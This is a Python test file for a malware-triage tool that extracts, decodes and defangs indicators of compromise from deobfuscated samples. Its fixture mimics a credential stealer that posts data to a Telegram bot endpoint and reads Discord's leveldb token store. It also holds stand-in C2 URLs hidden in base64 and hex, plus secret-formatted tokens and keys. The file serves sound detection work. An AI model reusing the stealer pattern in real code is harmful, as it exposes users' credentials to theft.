"""Gate: the indicator sheet finds what the sample tried to hide.

Two things are tested, and the second matters more than the first:

1. recall — branded tokens, wallets, keys, and addresses that are one codec
   away (base64, reversed base64, hex, rot13) are all reported;
2. precision — version strings, file names, loopback, documentation domains and
   binary garbage are *not* reported.  An indicator list an analyst has to
   hand-filter is worse than no list.
"""
import base64
import os
import sys
import tempfile

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(
    os.path.abspath(__file__)))))

from pydecomp.triage.iocs import (          # noqa: E402
    defang, entropy, extract, render_markdown, summary,
)

FAILED = []


def ok(condition, message):
    if not condition:
        FAILED.append(message)
        print(f"FAIL  {message}")


def has(sheet, label, needle):
    values = sheet["iocs"].get(label, [])
    return any(needle in value for value in values)


TELEGRAM = "8013735771:AAE_UrTgQsAmiAsXeDN6mehD_fo3vEg-kCM"
DISCORD = ("https://discord.com/api/webhooks/1226766972675428372/"
           "BuBywdldEWncg7fbIpEhCROLpkGLkYirOoP2bP-uzzO")
AWS = "AKIAZZ7Q5K2M4N6P8R1T"
GITHUB = "ghp_" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8"
STRIPE = "sk_" + "live_" + "4eC39HqLyjWDarjtT1zdp7dc"
JWT = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
       "eyJzdWIiOiIxMjM0NTY3ODkwIn0."
       "dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U")
WALLET = "0x52908400098527886E0F7030069857D2E4169EE7"
IP = "185.220.101.42"
HIDDEN_B64 = base64.b64encode(b"http://hidden-c2.example-cdn.top/gate.php").decode()
HIDDEN_REV = base64.b64encode(b"http://reversed-c2.example-cdn.top/x").decode()[::-1]
HIDDEN_HEX = b"http://hex-c2.example-cdn.top/drop".hex()

SAMPLE = f'''
import requests, os

WEBHOOK = "{DISCORD}"
BOT = "{TELEGRAM}"
CHAT_ID = 7613862165
AWS_KEY = "{AWS}"
GH = "{GITHUB}"
STRIPE = "{STRIPE}"
SESSION = "{JWT}"
WALLET = "{WALLET}"
C2 = "{IP}:8443"
BLOB = "{HIDDEN_B64}"
FLIPPED = "{HIDDEN_REV}"
HEXED = "{HIDDEN_HEX}"

def send(data):
    return requests.post("https://api.telegram.org/bot" + BOT + "/sendDocument",
                         data=data)

PROFILE = os.getenv("APPDATA") + "\\\\Discord\\\\Local Storage\\\\leveldb\\\\"
# noise a naive scraper reports and a human ignores
VERSION = "1.0.0"
LOCAL = "127.0.0.1"
DOCS = "https://docs.python.org/3/library/marshal.html"
MODULE = "marshal.py"
EXAMPLE = "admin@example.com"
JUNK = "%DL%\\\\xf0\\\\x00\\\\x06hxe"
RANGE = "131.0.0.0"
'''


def main():
    sheet = extract(SAMPLE)

    # --- recall ------------------------------------------------------------
    ok(has(sheet, "discord-webhook", "1226766972675428372"), "discord webhook found")
    ok(has(sheet, "telegram-bot", TELEGRAM), "telegram bot token found")
    ok(has(sheet, "telegram-api", "api.telegram.org"), "telegram exfil URL found")
    ok(has(sheet, "telegram-chat", "7613862165"), "telegram chat id paired with the token")
    ok(has(sheet, "aws-key", AWS), "AWS access key found")
    ok(has(sheet, "github-token", "ghp_"), "GitHub token found")
    ok(has(sheet, "stripe-key", "sk_live_"), "Stripe live key found")
    ok(has(sheet, "jwt", "eyJhbGciOiJIUzI1NiIs"), "JWT found")
    ok(has(sheet, "eth", WALLET), "ETH wallet found")
    ok(has(sheet, "ipv4", IP), "C2 address found")
    ok(has(sheet, "browser-artifact", "leveldb"), "credential-store path found")

    # --- one codec away ----------------------------------------------------
    ok(has(sheet, "url", "hidden-c2.example-cdn.top"), "base64-hidden URL decoded and found")
    ok(has(sheet, "url", "reversed-c2.example-cdn.top"), "reversed-base64 URL decoded and found")
    ok(has(sheet, "url", "hex-c2.example-cdn.top"), "hex-hidden URL decoded and found")
    ok(sheet["where"].get("url") in ("recovered", "recovered+carved"), "url provenance recorded")

    # --- precision ---------------------------------------------------------
    ok(not has(sheet, "ipv4", "127.0.0.1"), "loopback is not an indicator")
    ok(not has(sheet, "ipv4", "131.0.0.0"), "/8 base address rejected")
    ok(not has(sheet, "ipv4", "1.0.0."), "version string not reported as an address")
    ok(not has(sheet, "domain", "python.org"), "documentation domain suppressed")
    ok(not has(sheet, "domain", "marshal.py"), "file name is not a domain")
    ok(not has(sheet, "email", "example.com"), "documented example email suppressed")
    ok(not has(sheet, "windows-path", "\\xf0"), "binary garbage not reported as a path")
    ok(not has(sheet, "telegram-bot", "NNR_HeGtDfNzvNfKrQA6zruQ"),
       "a rot13 view of a token is not a second token")
    for label, values in sheet["iocs"].items():
        ok(len(values) == len(set(values)), f"dedup holds for {label}")

    # --- defanging and the sheet -------------------------------------------
    ok(defang("http://a.b.c/x") == "hxxp://a[.]b[.]c/x", "url defanged")
    ok(defang("https://discord.com/api/webhooks/1/2") ==
       "hxxps://discord[.]com/api/webhooks/1/2", "webhook defanged without touching the path")
    ok(defang(IP + ":8443") == IP.replace(".", "[.]") + ":8443", "address with port defanged")
    ok(defang(IP) == IP.replace(".", "[.]"), "address defanged")
    md = render_markdown("sample.py", sheet, "deadbeef")
    ok(md.startswith("# Indicators — `sample.py`"), "sheet has a title")
    ok("hxxp" in md and "1226766972675428372" in md, "sheet lists defanged indicators")
    ok("[.]" in md, "dots defanged in the sheet")
    ok(summary(sheet["iocs"]).count("·") >= 3, "summary counts by type")
    ok(entropy("aaaaaaaa") < 1.0 < entropy("qz7Xv2Lm9Kd4"), "entropy separates order from noise")

    # --- carving the raw input ---------------------------------------------
    only_in_bytes = ("http://carved-only.example-cdn.top/stage2 "
                     "9f2c1e7d4b8a6c3f0e1d2c3b4a596877").encode()
    packed = bytes(range(256)) * 4 + only_in_bytes + bytes(range(256)) * 4
    carved = extract("print('hello')\n", raw=packed)
    ok(has(carved, "url", "carved-only.example-cdn.top"),
       "indicator that exists only inside the packed bytes is carved")
    ok(carved["where"].get("url") == "recovered+carved", "carved provenance flagged")
    ok(not carved["iocs"].get("ipv4"), "carving does not invent addresses from binary")

    # --- a real deobfuscation round trip -----------------------------------
    work = tempfile.mkdtemp()
    sample = os.path.join(work, "hidden.py")
    with open(sample, "w") as handle:
        handle.write(SAMPLE)
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "..", "..", "src"))
    from pydecomp.engine.run import deobfuscate
    saved = deobfuscate(sample, out_dir=os.path.join(work, "out"), reports=True,
                        verify=False, dry_run=False)
    ok(saved is not None, "cli roundtrip produced a file")
    if saved:
        folder = os.path.dirname(saved)
        stem = os.path.splitext(os.path.basename(saved))[0]
        ok(os.path.exists(os.path.join(folder, stem + ".iocs.md")),
           "IOC sheet written beside the recovered source")
        with open(os.path.join(folder, stem + ".iocs.md"), encoding="utf-8") as handle:
            sheet_text = handle.read()
        ok("telegram-bot" in sheet_text and "hxxps://discord" in sheet_text,
           "sheet carries the operational indicators")

    if FAILED:
        print(f"\n{len(FAILED)} failed")
        return 1
    print(f"\n{12 + 6 + 9} checks passed — all good")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
